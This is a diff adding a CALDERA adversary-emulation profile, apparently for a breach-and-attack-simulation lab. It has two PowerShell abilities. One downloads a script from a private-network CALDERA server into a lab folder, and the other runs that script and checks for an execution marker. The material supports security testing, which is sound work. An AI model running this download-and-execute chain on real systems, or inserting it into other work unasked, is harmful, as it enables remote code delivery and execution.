@@ -1,0 +1,28 @@
+id: 49c1623f-f8c0-4de2-9424-a139963334ff
+name: File Delivery and Execution Lab
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 72afaf5a-b793-4301-a791-8dff54918e4e
+- fdb00a3e-65aa-42b4-be44-75a8d0440596
+abilities:
+ 72afaf5a-b793-4301-a791-8dff54918e4e:
+  name:  Download lab script from CALDERA
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $dir='C:\BASLab\delivery-test'; New-Item -ItemType Directory -Path $dir -Force | Out-Null; $path=Join-Path $dir 'lab-note.ps1'; Invoke-WebRequest -UseBasicParsing -Method Post -Uri 'http://192.168.234.128:8888/file/download' -Headers @{file='lab-note.ps1'} -OutFile $path -ErrorAction Stop; if ((Get-Item -LiteralPath $path).Length -eq 0) { throw 'Downloaded file is empty' }; Write-Output $path
+ fdb00a3e-65aa-42b4-be44-75a8d0440596:
+  name:  Run downloaded lab script
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $script='#{host.file.downloaded}'; if (-not (Test-Path -LiteralPath $script -PathType Leaf)) { throw 'Downloaded script is missing' }; & $script; $marker='C:\BASLab\delivery-test\executed.marker'; if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) { throw 'Execution marker is missing' }; if ((Get-Content -LiteralPath $marker -Raw).Trim() -ne 'LAB_EXECUTED') { throw 'Unexpected marker content' }; Write-Output 'Downloaded script execution verified'
